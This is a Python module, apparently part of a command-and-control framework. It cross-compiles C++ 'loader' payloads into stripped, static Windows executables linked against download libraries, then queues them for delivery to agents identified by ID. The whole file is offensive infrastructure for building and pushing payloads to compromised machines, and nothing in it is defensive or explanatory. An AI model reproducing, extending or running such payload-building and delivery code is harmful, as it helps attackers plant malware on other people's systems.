# payloads/manager.py

import os
import subprocess
import glob
import time
from typing import List, Dict

from core.logger import log


class PayloadManager:
    def __init__(self):
        # ✅ SINGLE SOURCE OF TRUTH
        self.loaders_dir = "payloads/loaders"
        self.output_dir = self.loaders_dir  # ⚠️ SAME DIR (important)

    # ─────────────────────────────
    # LIST ALL LOADERS
    # ─────────────────────────────
    def list_payloads(self) -> List[Dict]:
        payloads = []

        for cpp_file in glob.glob(f"{self.loaders_dir}/*.cpp"):
            name = os.path.basename(cpp_file).replace(".cpp", "")
            exe_path = f"{self.output_dir}/{name}.exe"

            payloads.append({
                "name": name,
                "source": cpp_file,
                "compiled": os.path.exists(exe_path),
                "path": exe_path if os.path.exists(exe_path) else None
            })

        return payloads

    # ─────────────────────────────
    # COMPILE ALL (ONLY IF NEEDED)
    # ─────────────────────────────
    def compile_all(self) -> Dict:
        results = {}

        for payload in self.list_payloads():
            name = payload["name"]

            if payload["compiled"]:
                log(f"Already compiled: {name}")
                results[name] = {"status": "exists"}
                continue

            results[name] = self.compile_payload(name)

        return results

    # ─────────────────────────────
    # COMPILE SINGLE PAYLOAD
    # ─────────────────────────────
    def compile_payload(self, name: str) -> Dict:
        source = f"{self.loaders_dir}/{name}.cpp"
        output = f"{self.output_dir}/{name}.exe"

        # ✅ IF EXISTS → RETURN
        if os.path.exists(output):
            log(f"Already compiled: {name}")
            return {"name": name, "status": "exists", "path": output}

        if not os.path.exists(source):
            return {"name": name, "error": "Source file not found"}

        # ✅ USE CORRECT COMPILER
        cmd = [
            "x86_64-w64-mingw32-g++",
            source,
            "-o",
            output,
            "-static",
            "-O2",
            "-s",
            "-w",

            # COMMON LIBS (covers all loaders)
            "-lcrypt32",
            "-lgdi32",
            "-ladvapi32",
            "-luser32",
            "-lwininet",
            "-lurlmon",
            "-lshell32",
            "-lntdll"
        ]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )

            if result.returncode == 0:
                log(f"Compiled: {name}")
                return {
                    "name": name,
                    "status": "success",
                    "path": output
                }

            else:
                log(f"Compile failed: {name} -> {result.stderr}")
                return {
                    "name": name,
                    "error": result.stderr
                }

        except Exception as e:
            log(f"Exception compiling {name}: {str(e)}")
            return {
                "name": name,
                "error": str(e)
            }

    # ─────────────────────────────
    # GET BINARY (NO RECOMPILE BUG)
    # ─────────────────────────────
    def get_binary(self, name: str) -> bytes:
        path = f"{self.output_dir}/{name}.exe"

        # ✅ ONLY COMPILE IF NOT EXISTS
        if not os.path.exists(path):
            result = self.compile_payload(name)

            if "error" in result:
                raise Exception(result["error"])

        with open(path, "rb") as f:
            return f.read()

    # ─────────────────────────────
    # DEPLOY PAYLOAD
    # ─────────────────────────────
    def deploy(self, agent_id: str, payload_name: str) -> str:
        binary = self.get_binary(payload_name)

        task_id = f"deploy_{agent_id}_{payload_name}_{int(time.time())}"

        try:
            from flask import current_app

            if hasattr(current_app, "state"):
                current_app.state.set(f"payload:task:{task_id}", {
                    "agent_id": agent_id,
                    "payload": payload_name,
                    "size": len(binary),
                    "status": "pending_delivery"
                })

        except Exception:
            pass

        return task_id
